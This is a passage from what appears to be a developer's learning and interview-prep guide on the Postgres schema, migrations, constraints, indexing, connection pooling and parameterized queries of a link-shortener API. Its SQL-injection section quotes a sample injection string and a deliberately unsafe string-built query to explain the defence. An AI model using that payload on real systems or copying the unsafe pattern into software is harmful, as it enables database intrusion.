(on by default) refuses to run a migration file whose timestamp is out of
order relative to what's already recorded — it assumes migrations are
applied in the order they were created, and flags anything that looks like
it was inserted retroactively out of sequence.

**Where it lives in the codebase.** Not in this repo's own schema code at
all — `pgmigrations` is created automatically by node-pg-migrate the first
time `migrate:up` runs against a given database, in the `public` schema
alongside `users`/`links`/`clicks`.

**Common pitfalls.**

- Renaming a migration file after it's already been applied somewhere —
  the recorded `name` no longer matches any file on disk, and
  `check-order` (or a teammate's fresh `migrate:up`) gets confused about
  what's actually been run.
- Manually deleting rows from `pgmigrations` to "re-run" a migration —
  this re-runs `up` against a database that already has the resulting
  schema, which usually fails loudly (e.g. "relation already exists") but
  could silently corrupt state if the migration isn't purely additive.
- Assuming `pgmigrations` is the same across every environment — it isn't
  shared; each database (dev, test, staging, prod) has its own copy and
  its own independently-tracked history, by design.

**Production considerations.** Because tracking lives inside the target
database, "has this migration run in production" is always answerable
with a direct query against production itself — no external record to
keep in sync. This is also why a migration step in a deploy pipeline is
generally safe to re-run: node-pg-migrate will see the previously-applied
migrations already recorded and skip them.

**Interview answer.** node-pg-migrate tracks its own history by creating a
`pgmigrations` table in the database it's migrating, recording each
applied migration's filename and timestamp. That's how it knows, on any
given run, which files are new versus already applied — it's asking the
database's own state, not trusting the filesystem or some external
record. It also means each environment's migration history is independent
and self-contained: what's been applied to dev tells you nothing about
what's been applied to production, which is exactly the isolation you
want.

---

### UUID primary keys vs serial — the enumeration/security tradeoff

**What it is.** Every table here uses `id uuid primary key default
gen_random_uuid()` instead of Postgres's traditional auto-incrementing
`serial`/`bigserial` integer primary key.

**Why it exists in this project.** `links.short_code` is only meaningful
as a public, guessable-resistant identifier if the underlying `id` doesn't
leak information — with a `serial` id, `/links/1043` next to `/links/1044`
tells an outside observer roughly how many links exist and lets them
enumerate every one by incrementing a number. UUIDs (122 bits of
randomness for v4) make that infeasible: there's no ordering or count to
infer, and no way to iterate "the next record" by guessing.

**How it works mechanically.** `gen_random_uuid()` is a Postgres built-in
function (native to core since Postgres 13, confirmed unnecessary to add
any extension for on this project's Postgres 16) that generates a random
version-4 UUID. Setting it as a column `default` means Postgres generates
the value at insert time if the application doesn't supply one — the same
pattern `serial`'s auto-increment uses, just backed by randomness instead
of a sequence counter.

**Where it lives in the codebase.** `id: { type: 'uuid', primaryKey: true,
default: pgm.func('gen_random_uuid()') }` in each of the three
`migrations/*.ts` files.

**Common pitfalls.**

- Generating UUIDs in application code instead of the database — it works,
  but then every insert path has to remember to do it, and a raw `INSERT`
  run from `psql` or a script that forgets would fail or silently rely on
  no default existing.
- Assuming UUIDs are free performance-wise — a random UUID primary key
  means new rows insert at random points in the primary key's B-tree index
  rather than always appending at the end (`serial` always inserts at the
  tail), which causes more index page splits under high insert volume than
  a sequential key would. Not a concern at this project's current scale,
  but a real, measurable cost at high write throughput.
- Confusing "not enumerable" with "not guessable everywhere" — UUIDs
  protect against sequential enumeration of internal ids, but
  `links.short_code` (the actual public-facing identifier) has its own,
  separate design consideration for how hard it should be to guess, not
  covered by the `id` column's UUID-ness at all.
- Requiring the `pgcrypto` or `uuid-ossp` extension unnecessarily — a
  common Postgres tutorial pattern from before `gen_random_uuid()` was
  built into core; on Postgres 13+ (this project targets 16) it's already
  available, so adding either extension here would be an unjustified
  dependency.

**Production considerations.** At very high write volume, some teams
switch to UUIDv7 (time-ordered UUIDs, standardized in 2024) specifically
to get sequential-ish insert locality back while keeping
non-enumerability — worth revisiting if `links`/`clicks` insert rate ever
makes B-tree fragmentation from `id`'s randomness a measured problem, not
a theoretical one.

**Interview answer.** I use database-generated UUIDs instead of serial
integers for primary keys specifically because this is a public-facing
API — a sequential id leaks how many records exist and lets anyone
enumerate every row by incrementing a number, which a random UUID makes
infeasible. The tradeoff is write performance at scale: sequential keys
always insert at the end of their index, while random UUIDs insert at
random points, causing more B-tree page splits under high volume. For this
project's current scale that cost isn't a concern; if it ever became one,
UUIDv7 (time-ordered, still non-sequential-looking) is the usual
middle-ground fix.

---

### CHECK constraints for cross-column business rules

**What it is.** A `CHECK` constraint is a boolean SQL expression attached
to a table that every row must satisfy — Postgres rejects any `INSERT` or
`UPDATE` that would make it false, with no way around it short of dropping
the constraint.

**Why it exists in this project.** A user must authenticate via exactly
one method: a local password, or an OAuth identity, never both, never
neither. That's not a single-column rule (`NOT NULL` can't express it —
it spans `password_hash`, `oauth_provider`, and `oauth_id` together), so it
needs a rule that can see all three columns on the same row at once.
Similarly, `links.max_clicks` being positive and `links.click_count` being
non-negative are invariants about what a valid row looks like, not
something any single column type can enforce alone.

**How it works mechanically.** `users_password_xor_oauth_check` is:

```sql
(password_hash IS NOT NULL AND oauth_provider IS NULL AND oauth_id IS NULL)
OR
(password_hash IS NULL AND oauth_provider IS NOT NULL AND oauth_id IS NOT NULL)
```

This is a true XOR — exactly one branch must be true — not just "at least
one of these is set," because a row with _both_ a password and an OAuth
identity has no defined precedence rule anywhere in the application, so
the schema simply refuses to let that state exist. Postgres evaluates this
expression against every candidate row on every insert/update and raises a
`check_violation` error (SQLSTATE `23514`) if it evaluates to false.

**Where it lives in the codebase.**
`users_password_xor_oauth_check` in `migrations/*_create-users-table.ts`;
`links_max_clicks_positive_check` and `links_click_count_non_negative_check`
in `migrations/*_create-links-table.ts`. Exercised directly in
`tests/db/constraints.test.ts`, asserting on the `23514` error code.

**Common pitfalls.**

- Writing "at least one" instead of true XOR — `(password_hash IS NOT NULL
OR oauth_provider IS NOT NULL)` would let a row have both set, silently
  leaving an ambiguous state the rest of the application has to guard
  against anyway, defeating the point of enforcing it here.
- Forgetting that `CHECK` constraints don't fire on columns not mentioned
  in an `UPDATE` — they re-validate the _entire row_ on every write, so
  this is a non-issue for correctness, but worth knowing when reasoning
  about how often a given constraint actually gets evaluated.
- Relying only on this check and never testing it — an untested constraint
  can silently stop matching what the application actually inserts after a
  refactor, and the failure mode (a legitimate insert suddenly rejected in
  production) is worse than not having the constraint enforced strictly at
  all.

**Production considerations.** `CHECK` constraints are validated on every
write, so they have a real (small) cost — for the constraints in this
schema, a handful of `IS NULL` comparisons per row, negligible compared to
the write itself. Adding a `CHECK` constraint to an _existing_, populated
table is a heavier operation in production: Postgres has to scan the whole
table to verify every existing row satisfies the new rule before it can
add the constraint (unless added as `NOT VALID` and validated separately,
a technique for large tables not needed here since these tables start
empty).

**Interview answer.** `CHECK` constraints let the database itself enforce
rules that span multiple columns on the same row — here, that a user has
exactly one authentication method, and that `links.click_count`/
`max_clicks` stay within valid ranges. I wrote the auth rule as a true
XOR rather than "at least one," because a row satisfying both conditions
would have no defined meaning anywhere downstream, and the schema is the
right place to make that state simply impossible rather than trusting
every future code path to check for it.

---

### NULL semantics in UNIQUE constraints

**What it is.** In standard SQL, `NULL` is never considered equal to
another `NULL` — including for the purposes of a `UNIQUE` constraint. Two
rows that both have `NULL` in a uniquely-constrained column don't violate
uniqueness, because SQL never actually compares them as "equal."

**Why it exists in this project.** `users` has a `UNIQUE(oauth_provider,
oauth_id)` constraint meant to stop two different user rows from claiming
the same OAuth identity. But most users in this schema are password-only,
meaning both `oauth_provider` and `oauth_id` are `NULL` for them — and
there can be arbitrarily many such users. If `NULL` uniqueness worked like
"any two nulls are duplicates," only one password-only user could ever
exist, which would obviously be wrong.

**How it works mechanically.** Because Postgres (following the SQL
standard) treats `NULL <> NULL`, the unique constraint only actually
fires when comparing two rows that both have _non-null_ values in
`oauth_provider` and `oauth_id` — exactly the case of two different users
claiming the same real OAuth identity, which is the one case this
constraint is meant to prevent. Every password-only row, with both
columns `NULL`, is simply never compared as a duplicate of any other
password-only row.

**Where it lives in the codebase.** `users_oauth_identity_unique` in
`migrations/*_create-users-table.ts`, added as a plain
`pgm.addConstraint('users', ..., { unique: ['oauth_provider', 'oauth_id'] })`
— no partial index (`WHERE oauth_provider IS NOT NULL`) needed, since the
plain constraint already behaves correctly for exactly this reason.

**Common pitfalls.**

- Assuming a plain `UNIQUE` constraint would block multiple `NULL` rows —
  a genuinely common misconception (it doesn't, in every mainstream SQL
  database including Postgres), which leads people to reach for a partial
  index defensively when it isn't needed.
- The opposite mistake: relying on `NULL <> NULL` uniqueness semantics
  somewhere they _don't_ want it — e.g. expecting a `UNIQUE(email)`
  constraint to block a second row with a `NULL` email, when it wouldn't
  (this project sidesteps the issue since `email` is `NOT NULL`).

**Production considerations.** This is a Postgres/SQL-standard behavior,
not a Click Scope-specific choice — it's worth knowing cold, since it
comes up any time a nullable column participates in a uniqueness rule,
which is common in schemas with optional identity/linking columns like
this one.

**Interview answer.** SQL treats `NULL` as never equal to `NULL`, even
inside a `UNIQUE` constraint — so a plain `UNIQUE(oauth_provider,
oauth_id)` still allows unlimited rows where both columns are `NULL`, and
only actually blocks two rows that both have the _same non-null_ values.
That's exactly the behavior this schema needs: password-only users (both
columns null) should coexist freely, while two users claiming the same
real OAuth identity should not — so the plain constraint is sufficient on
its own, with no partial index required.

---

### Case-insensitive uniqueness: functional index vs citext vs app-level lowercasing

**What it is.** Three different ways to make `foo@bar.com` and
`Foo@Bar.com` collide as "the same email" for uniqueness purposes: a
functional (expression) unique index on `lower(email)`; the `citext`
extension, which makes an entire column type case-insensitive; or trusting
application code to lowercase every email before it's written or queried.

**Why it exists in this project.** Users will sign in by email, typed by
hand — case shouldn't matter for whether an email is a duplicate.
`email text` alone with a plain `UNIQUE` constraint compares byte-for-byte,
so it would let `dev@example.com` and `Dev@Example.com` register as two
different accounts.

**How it works mechanically.** This project uses a functional unique
index: `CREATE UNIQUE INDEX ON users (lower(email))`. Postgres evaluates
`lower(email)` for every row and indexes _that_ value, so the uniqueness
check compares lowercased values regardless of what case was actually
stored. `citext` (a Postgres extension) would instead change the column's
type entirely, making every comparison, sort, and `LIKE` on that column
implicitly case-insensitive everywhere it's used, not just for uniqueness.
App-level lowercasing means always calling `.toLowerCase()` before an
insert or `WHERE email = $1` query — enforced by discipline, not the
database.

**Where it lives in the codebase.**
`users_email_lower_unique_idx` in `migrations/*_create-users-table.ts`.

**Common pitfalls.**

- Choosing `citext` without wanting its full scope of behavior change —
  it's not just "unique index, but case-insensitive"; every future query,
  `ORDER BY`, and `LIKE` against that column silently becomes
  case-insensitive too, which is a bigger, harder-to-reason-about surface
  than this project's actual requirement (uniqueness only).
- Relying purely on app-level lowercasing — it only protects paths that
  remember to do it. A migration, a seed script, an admin tool, or a
  future teammate's raw `INSERT` can all bypass it, and the database has
  no way to catch the resulting duplicate.
- Using `ON CONFLICT (email)` for upserts against this schema — it won't
  work, because the actual unique index is on the _expression_
  `lower(email)`, not the bare `email` column; `scripts/seed.ts` handles
  this with an explicit `WHERE lower(email) = lower($1)` existence check
  instead.

**Production considerations.** Application code should still normalize
email to lowercase on write and lookup, for consistency (so a query for
`Foo@Bar.com` finds the row even before hitting the index, and so stored
values look uniform) — but the functional index is what actually
_guarantees_ no duplicate can exist, regardless of whether every code path
remembers to normalize.

**Interview answer.** I enforce case-insensitive email uniqueness with a
functional unique index on `lower(email)`, rather than the `citext`
extension or trusting application code to lowercase consistently. `citext`
changes the column's comparison semantics everywhere it's used, which is
more behavior change than a single uniqueness rule needs; app-level
lowercasing only protects code paths that remember to call it, and the
database can't catch a duplicate that slips through a path that doesn't.
A functional index gets the guarantee at the one layer that can't be
bypassed, at the cost of needing to remember `ON CONFLICT`/lookup queries
have to match on the same expression, not the bare column.

---

### Foreign keys and ON DELETE CASCADE

**What it is.** A foreign key is a constraint saying "this column's value
must exist as a primary key value in another table." `ON DELETE CASCADE`
extends that: when the referenced row is deleted, Postgres automatically
deletes every row that referenced it too, rather than leaving them
pointing at nothing or blocking the delete.

**Why it exists in this project.** `links.user_id` must always point at a
real user, and `clicks.link_id` must always point at a real link — a link
"owned by" a nonexistent user, or a click recorded against a nonexistent
link, is meaningless application state. `ON DELETE CASCADE` on both
matches the intended product behavior directly: deleting a user's account
should remove their links, and deleting a link should remove its click
history, without the application having to orchestrate that deletion
order itself.

**How it works mechanically.** Declared at the column level in each
migration — `user_id: { references: 'users', onDelete: 'CASCADE' }` on
`links`, `link_id: { references: 'links', onDelete: 'CASCADE' }` on
`clicks`. Postgres physically enforces this: a `DELETE FROM users WHERE
id = $1` triggers Postgres itself to find and delete every matching row in
`links` first (and, transitively, every `clicks` row referencing those
links), inside the same transaction as the original delete, before the
delete completes. There's no way to bypass this from the application layer
short of dropping the constraint.

**Where it lives in the codebase.** The `references`/`onDelete` fields on
`links.user_id` and `clicks.link_id` in their respective migration files.
Verified directly in `tests/db/constraints.test.ts`'s "ON DELETE CASCADE"
test — insert a user, a link, and a click, delete the user, assert both
descendant rows are gone.

**Common pitfalls.**

- Assuming cascade delete is "safe by default" for every relationship — it
  is here because the product behavior genuinely wants a full cascade, but
  the same pattern applied carelessly (e.g. deleting a
  frequently-referenced lookup row) can wipe out far more data than
  intended. `ON DELETE CASCADE` should always be a deliberate choice per
  relationship, never a default habit.
- Forgetting that cascades run inside the deleting transaction — a cascade
  touching millions of dependent rows (not a concern at this project's
  current scale) can turn a single-row delete into a slow, lock-heavy
  operation.
- Not indexing the foreign key column (see the next section) — Postgres
  still enforces the cascade correctly without an index, just by scanning
  the whole dependent table to find matching rows, which gets slow as that
  table grows.

**Production considerations.** Cascading deletes are convenient but
irreversible and untraceable after the fact — there's no built-in audit
trail of "this delete cascaded and removed these N rows." For anything
where that history matters (e.g. compliance, dispute resolution), a
soft-delete pattern (a `deleted_at` column, filtered out at the query
layer) is the usual alternative — not needed for this project yet, but
worth knowing as the tradeoff being made now.

**Interview answer.** A foreign key guarantees referential integrity — a
column's value must exist as a primary key elsewhere — and `ON DELETE
CASCADE` extends that so deleting the referenced row automatically deletes
every dependent row too, enforced physically by the database inside the
same transaction. I used it for both `users → links` and `links → clicks`
because that matches the actual product behavior: deleting an account
should remove that account's links, and deleting a link should remove its
click history, without the application having to manually orchestrate
delete order or risk leaving orphaned rows if it forgets a step.

---

### Constraints vs. application-level checks

**What it is.** The same rule — "this email must be unique," "this user
must have a password or an OAuth identity" — can be enforced either inside
the database (a constraint) or in application code (a check-then-write, an
`if` statement before an `INSERT`). They are not equivalent, even when
they express the identical rule.

**Why it exists in this project.** CLAUDE.md's non-negotiable conventions
already require every constraint in this schema to be enforced at the
database level, not just checked in application code — this section is
about _why_ that's the actual rule, not merely a style preference.

**How it works mechanically — the race condition app-level checks can't
close.** Consider an app-level uniqueness check implemented as "look up
whether this email already exists, and only insert if it doesn't":

```
1. SELECT id FROM users WHERE lower(email) = lower($1)   -- request A
2. SELECT id FROM users WHERE lower(email) = lower($1)   -- request B, concurrently
3. (both see: no existing row)
4. INSERT ... (request A)                                 -- succeeds
5. INSERT ... (request B)                                 -- also succeeds!
```

If both requests run their `SELECT` before either has run its `INSERT`,
both see "no existing user" and both proceed to insert — two duplicate
accounts, from code that looks like it prevents exactly that. This isn't a
hypothetical: two signup requests for the same email arriving within
milliseconds of each other (a double-click, a retried request, a bot) hit
this window in practice. A database-level `UNIQUE` constraint has no such
window — even if both `INSERT`s run concurrently, Postgres guarantees only
one can actually commit; the second gets a `unique_violation` error at the
database level, unconditionally, regardless of what either request's
application code checked beforehand.

**Where it lives in the codebase.** Every constraint in
`migrations/*.ts` (the `UNIQUE` indexes, the `CHECK` constraints, the
foreign keys) is the actual enforcement; nothing in this phase relies on
an application-level check as its only guard.

**Common pitfalls.**

- Treating an app-level check as sufficient "because it's fast" or
  "because we validate in the route already" — validation at the route
  boundary (this project's Zod schemas, in later phases) is about
  rejecting obviously malformed input early and cheaply, not about
  guaranteeing uniqueness or cross-row invariants, which require the
  database's transactional guarantees to be race-free.
- Only discovering the race in production, under real concurrent load —
  it's very easy to write and manually test an app-level check that looks
  correct, because manual testing rarely fires two requests within the
  same millisecond.

**Production considerations.** This is precisely the class of bug that
"works in every test, fails once a month in production under real
traffic" — intermittent, hard to reproduce, and easy to misdiagnose as
something else (a caching bug, a client-side double-submit) unless the
underlying cause (a check-then-write race) is understood.

**Interview answer.** An application-level uniqueness check —query for an
existing row, then insert if none is found — has an unavoidable race
condition under concurrent requests: two requests can both query, both see
no existing row, and both insert, because there's a window between the
check and the write where neither request knows about the other's
in-flight operation. A database-level `UNIQUE` constraint closes that
window entirely, because the database guarantees only one of two
concurrent inserts can actually commit, independent of what either
request checked beforehand. That's why constraints belong in the schema,
not just in application code — it's not a style preference, it's the
difference between a rule that's actually always true and one that's true
except under a specific, hard-to-reproduce timing condition.

---

### timestamptz vs. timestamp

**What it is.** Postgres has two similar-looking timestamp types:
`timestamp` (officially `timestamp without time zone`) stores a date and
time with no timezone information at all — just a naive clock reading.
`timestamptz` (`timestamp with time zone`) stores an absolute instant:
internally, Postgres always keeps it as UTC, converting to/from whatever
session timezone is in effect only for display.

**Why it exists in this project.** Every timestamp column in this schema
(`created_at`, `updated_at`, `clicked_at`) is `timestamptz`, with no
exceptions. A click's `clicked_at` needs to represent one unambiguous
moment regardless of what timezone the application server, the database
server, or a future analytics job happens to be running in — sorting
clicks chronologically, or comparing "was this within the last hour," has
to be correct no matter where any of those processes are deployed.

**How it works mechanically.** With `timestamp`, `'2026-03-05
14:00:00'` means different real-world instants depending on who's reading
it — 2pm in what timezone? Nothing in the stored value says. With
`timestamptz`, Postgres stores the UTC-normalized instant internally
(regardless of what timezone the value was inserted with) and only
converts on the way _out_, based on the connecting session's `timezone`
setting — so the stored value is always the same absolute point in time,
and only its textual _display_ changes.

**Where it lives in the codebase.** `created_at`/`updated_at` on `users`
and `links`, `clicked_at` on `clicks` — all `timestamptz not null default
now()` in their respective migration files.

**Common pitfalls.**

- Using `timestamp` because it "looks simpler" — it defers the timezone
  problem rather than avoiding it; the moment the application server, the
  database, or a downstream consumer runs in a different timezone (or a
  server's timezone config silently changes), stored `timestamp` values
  become ambiguous or wrong without any error ever being raised.
- Assuming `timestamptz` "stores the timezone" — it doesn't store a
  timezone label at all; it stores UTC and converts for _display_ only.
  Two rows inserted from different timezones with the same real-world
  instant store as the identical value.
- Comparing/sorting a mix of `timestamp` and `timestamptz` values across
  tables — Postgres will implicitly convert using the session's timezone,
  which can silently produce wrong comparisons if that assumption isn't
  understood.

**Production considerations.** `timestamptz` is close to a
default-always-correct choice for anything sorted, compared, or persisted
across regions or process restarts — the mental model "always
`timestamptz` unless you have a specific reason not to" holds up well in
practice and avoids an entire class of subtle, hard-to-reproduce
timezone bugs.

**Interview answer.** `timestamptz` stores an absolute instant — Postgres
normalizes it to UTC internally and only converts for display based on the
session's timezone — while plain `timestamp` stores a naive clock reading
with no timezone information at all, which becomes ambiguous the moment
more than one timezone is involved anywhere in the system. I use
`timestamptz` for every timestamp column in this schema because sorting
and comparing timestamps (when did this click happen, relative to another)
has to be correct regardless of what timezone any given process is
running in, and `timestamp` just defers that problem instead of solving
it.

---

### Nullable columns as domain modeling

**What it is.** Whether a column is declared `NOT NULL` or left nullable
isn't just a data-integrity nicety — it's a direct statement about what
states are valid for a row to be in.

**Why it exists in this project.** `users.password_hash` is nullable
specifically because a valid user can exist with no password at all — an
OAuth-only user. Making it `NOT NULL` would either be factually wrong (it
would force every OAuth user to have _some_ password value, even a
meaningless placeholder) or would require a separate table/split schema
just to represent two different kinds of "valid user." A nullable column,
paired with the CHECK constraint enforcing exactly one auth method, models
the real domain accurately: "this field may legitimately be absent for
some valid rows" without needing to invent a fake non-null placeholder.

**How it works mechanically.** Every column in this schema was decided
individually: `NOT NULL` where the row is genuinely incomplete/invalid
without it (`email`, `short_code`, `destination_url`, all four
timestamp columns), nullable where the field's absence is itself
meaningful domain state (`password_hash`/`oauth_provider`/`oauth_id` on
`users`; `password_hash`/`expires_at`/`max_clicks` on `links`, where
`NULL` specifically means "no password gate" / "never expires" /
"unlimited clicks" — not "unknown" or "not yet set").

**Where it lives in the codebase.** Every `ColumnDefinition` across the
three `migrations/*.ts` files — `notNull: true` is explicit wherever a
column requires it, and simply absent (defaulting to nullable) wherever
the domain allows a legitimate absence.

**Common pitfalls.**

- Defaulting everything to `NOT NULL` "to be safe" — this often just
  forces a meaningless placeholder value into existence (an empty string,
  a sentinel date) instead of letting `NULL` represent "genuinely not
  applicable," which then has to be special-cased everywhere the column is
  read.
- Defaulting everything to nullable "to avoid insert errors" — this hides
  genuine bugs (a required field silently missing) behind a schema that
  can't tell the difference between "not applicable" and "forgot to set
  it."
- Conflating "nullable" with "optional in the API" — a column can be
  `NOT NULL` in the database while still being optional in a request body,
  if the application supplies a sensible default before the insert; the
  two concerns (schema validity, API ergonomics) are related but not the
  same decision.

**Production considerations.** Getting nullability right up front matters
more than most schema decisions, because changing a column from nullable
to `NOT NULL` later requires either backfilling every existing `NULL` row
or deciding what to do with them — a migration that's easy on an empty
table and can be genuinely difficult on a large, populated one.

**Interview answer.** I treat nullable-vs-not-null as a domain modeling
decision, not just a data-integrity default. `password_hash` is nullable
specifically because a valid user can legitimately have no password — an
OAuth-only account — and forcing it to `NOT NULL` would mean inventing a
meaningless placeholder value just to satisfy the schema. The rule I use
is: `NOT NULL` where a row is genuinely incomplete without the field,
nullable where the field's absence is itself valid, meaningful state —
not "unknown," but "legitimately not applicable" — which is exactly what
`NULL` is for.

---

### Indexes: what they cost on writes, and which ones constraints create for free

**What it is.** An index is a separate, ordered data structure Postgres
maintains alongside a table specifically to make certain lookups fast
without scanning every row. Every index also has a cost: every `INSERT`,
`UPDATE`, or `DELETE` on the table has to update every index on it too,
not just the table's own storage.

**Why it exists in this project.** This phase deliberately adds only two
indexes beyond what constraints create automatically — `links(user_id)`
and `clicks(link_id)` — each justified by a specific, real query pattern
this schema implies, not spec­ulatively. Every other index that was
considered (`clicks.clicked_at`, `links.expires_at`, `links.is_active`)
was explicitly rejected for now, since no route in this phase actually
queries by those columns yet, and an unused index is pure write-cost with
no compensating read benefit.

**How it works mechanically.** Postgres automatically creates a matching
index for every `PRIMARY KEY` and every `UNIQUE` constraint (including the
functional `lower(email)` unique index) — those aren't optional or
separately requested; the index is _how_ the constraint is enforced
efficiently. What Postgres does **not** do automatically is index foreign
key columns — `links.user_id` and `clicks.link_id` need an explicit
`pgm.createIndex(...)` call, or two very common query patterns ("list a
user's links," "list a link's clicks" — plus every `ON DELETE CASCADE`
that has to find matching dependent rows) fall back to a full table scan
as the table grows.

**Where it lives in the codebase.** `pgm.createIndex('links', 'user_id')`
in `migrations/*_create-links-table.ts`; `pgm.createIndex('clicks',
'link_id')` in `migrations/*_create-clicks-table.ts`. Each migration
file has an explicit comment noting which indexes were considered and
rejected, and why — so a future reader knows they were deliberately
deferred, not overlooked.

**Common pitfalls.**

- Assuming a foreign key is automatically indexed because it's constrained
  — Postgres validates the _reference_ on write (does the row exist in the
  parent table), which doesn't require an index on the child column at
  all; it's a genuinely separate decision from whether that column is fast
  to _query by_, and a surprisingly common gotcha even among experienced
  Postgres users.
- Adding an index "because it might be useful later" — every unused index
  is a real, ongoing cost (slower writes, more disk space, more
  vacuum/maintenance work) with zero benefit until a query actually uses
  it; this project's own convention (justify from an actual query pattern,
  not a guess) exists specifically to avoid this.
- Forgetting that adding an index to a large, already-populated table in
  production is itself an operation with real cost/locking implications
  (mitigated by `CREATE INDEX CONCURRENTLY`, not needed here since these
  tables start empty).

**Production considerations.** Phase 11 of this project is explicitly
reserved as a dedicated, measurement-driven indexing pass — once there are
real routes and real query patterns (and ideally `EXPLAIN ANALYZE` output
from production-like data volumes), that's when `clicked_at` and similar
columns get revisited, backed by evidence instead of speculation. (This
originally said "Phase 12" — corrected once the indexing pass actually
landed as Phase 11; see "Phase 11: Database Optimization" below.)

**Interview answer.** Every index speeds up specific reads at the cost of
slowing down every write to that table, so I only add one when I can name
the exact query it serves. Postgres creates indexes automatically for
primary keys and unique constraints — that's not optional, it's how those
constraints are enforced — but it does _not_ automatically index foreign
key columns, which is a common gotcha since people often assume "this
column is constrained" implies "this column is indexed." I added indexes
on `links.user_id` and `clicks.link_id` specifically because those serve
real, known query patterns (and the cascading deletes), and deliberately
left out anything I couldn't point to an actual query for yet — that's a
measurement-driven pass reserved for later, not a guess made now.

---

### Connection pooling

**What it is.** Opening a new TCP connection and authenticating to
Postgres for every single query is slow — a connection pool keeps a small
set of already-authenticated connections open and hands them out to
whichever query needs one next, reusing them instead of paying that setup
cost repeatedly.

**Why it exists in this project.** Every request this API eventually
serves will need to run at least one database query; without pooling,
each request would pay full connection-setup latency on top of the
query's own latency, and the application would have no control over how
many concurrent connections it opens against Postgres (which has its own
hard connection ceiling).

**How it works mechanically.** `src/db/pool.ts` constructs a single
`pg.Pool` at module load time, shared by the whole process. Sizing and
timeout tradeoffs, each a deliberate choice rather than a default:

- **`max: 10`** — this is one long-running Express process, not a
  serverless function spinning up a fresh pool per invocation. Local
  Postgres defaults to `max_connections: 100`, so 10 leaves headroom for
  `psql`, other local tooling, and the separate worker process's own pool.
  In production (Supabase), the Supavisor pooler multiplexes connections
  server-side, so this number just needs to be modest — Supavisor's own
  limits are the real ceiling to watch, not Postgres's raw
  `max_connections`.
- **`connectionTimeoutMillis: 5000`** — how long a query will wait for a
  connection to become available (or for a new one to establish) before
  giving up. Long enough to survive a brief network blip to a remote
  database, short enough that a genuinely broken database fails a request
  fast instead of hanging it indefinitely.
- **`idleTimeoutMillis: 30000`** — how long an idle connection sits in the
  pool before being closed. Balances not thrashing new connections under
  bursty traffic against not holding connections open against Supavisor
  longer than actually needed.

**Where it lives in the codebase.** `src/db/pool.ts` — the `pool` export
and the `query()` helper wrapping it; `src/server.ts`'s `shutdown`
function calls `pool.end()`.

**Common pitfalls.**

- Creating a new `Pool` per request or per module instead of one shared
  instance — defeats the entire purpose, since each pool independently
  opens its own connections up to its own `max`, multiplying real
  connection count with no coordination between them.
- Not handling the pool's `'error'` event — `pg.Pool` emits `'error'` on
  an _idle_ client (e.g. the database restarts, silently killing a
  connection nobody is actively using) completely independently of any
  query in flight. Without a listener, this is an unhandled `'error'`
  event, which crashes the Node process outright — a genuinely common,
  easy-to-miss `pg` gotcha, addressed here by wiring it to the shared Pino
  `logger`.
- Sizing the pool arbitrarily large "to be safe" — a bigger pool doesn't
  make Postgres faster; past a certain point it just means more idle
  connections consuming memory on the database server for no throughput
  benefit, and can push a shared database past its own connection ceiling
  faster than expected once multiple app instances are running.

**Production considerations — pool exhaustion.** If every one of the
pool's `max` connections is checked out (in use by in-flight queries) and
a new query comes in, that query waits up to
`connectionTimeoutMillis` for one to free up, then throws a timeout error
if none does. This is the practical failure mode of "the database is too
slow" or "too many concurrent requests" — not necessarily Postgres itself
being overloaded, but this process's own pool being fully checked out. In
production, this shows up as a spike in `connectionTimeoutMillis`-flavored
errors in logs, request latency climbing right before those errors start,
and (with proper instrumentation) a pool utilization metric sitting at
`max` for a sustained period — the concrete signal to watch for and alert
on, once this project has real production traffic and metrics.

**Interview answer.** A connection pool keeps a small set of
already-authenticated database connections open and reuses them across
requests, instead of paying full connection setup cost per query. I sized
this pool at `max: 10` reasoning from the actual deployment shape — one
long-running process, not serverless, with a managed Postgres pooler
(Supavisor) doing the heavier multiplexing in production — rather than
picking an arbitrary number. Pool exhaustion, where every connection is
checked out and a new query has to wait, is the practical failure mode to
watch for in production: it shows up as request latency climbing and then
connection-timeout errors, and is usually a sign of either genuinely too
much concurrent load or a slow query holding connections longer than it
should, not necessarily Postgres itself being at capacity.

---

### Parameterized queries: protocol-level injection prevention

**What it is.** Passing query parameters as a separate array (`query('...
WHERE email = $1', [email])`) rather than building the SQL string by
concatenating or interpolating values directly into it.

**Why it exists in this project.** CLAUDE.md requires this without
exception — every query in `src/db/pool.ts`'s `query()` helper, every
query in `scripts/seed.ts`, every query in the test suite, uses
`$1`/`$2`/... placeholders with a separate values array. This isn't a
style preference; it's the mechanism that makes SQL injection structurally
impossible for these queries, not just unlikely.

**How it works mechanically.** With string concatenation, a value is
spliced directly into the SQL text before the database ever sees it — if
that value contains SQL syntax (a `'` followed by more SQL), the database
has no way to tell "user-supplied data" from "part of the command," and
executes whatever the resulting string says. Parameterized queries work
completely differently, at the wire protocol level: the query text
(`SELECT * FROM users WHERE email = $1`) and the parameter values
(`['attacker" OR "1"="1']`) are sent to Postgres as two _separate_ pieces
in the protocol message. Postgres parses and plans the query text alone
first — parameters are never substituted into the SQL string at all, on
either the client or server side — and only afterward binds the parameter
values into the already-fixed query plan as pure data. A malicious string
can't "become" SQL syntax because it's never in a position where it could
be parsed as SQL in the first place — the query structure was already
fixed before the value was ever involved. This is a fundamentally
different guarantee than escaping (sanitizing a string so any embedded
quotes are neutralized before concatenation), which still trusts the
string-building step to be implemented, and enabled, correctly every
single time.

**Where it lives in the codebase.** The `query()` function in
`src/db/pool.ts` and every one of its callers so far
(`scripts/seed.ts`, `tests/db/*.test.ts`) — the `text` argument is always
a static string with `$n` placeholders, `params` always carries the actual
values, never the other way around.

**Common pitfalls.**

- Using template literals to build query text with a value spliced in
  (`` `SELECT * FROM users WHERE email = '${email}'` ``) — even when the
  value "looks safe" in every test case tried, this is exactly the pattern
  that's exploitable the moment an untrusted value contains a `'`.
  reintroduces the exact vulnerability parameterization exists to close.
- Believing escaping functions are an equivalent substitute — they can be
  implemented correctly, but they have to be remembered and applied
  consistently at every single call site; parameterized queries make the
  safe path the _only_ path, structurally, rather than relying on
  discipline.
- Table/column names can't be parameterized this way at all (`$1` only
  works for values, not identifiers) — `tests/globalSetup.ts`'s
  `CREATE DATABASE "${dbName}"` is a deliberate, narrow exception, safe
  only because `dbName` comes from this project's own `.env.test` config,
  never from request input.

**Production considerations.** This is the single most important defense
against SQL injection, one of the OWASP Top 10 vulnerability classes, and
it's cheap: the `pg` driver supports parameterized queries natively, so
there's no performance or ergonomics tradeoff to justify skipping it
anywhere.

**Interview answer.** Parameterized queries prevent SQL injection at the
wire protocol level, not by sanitizing strings. The query text and the
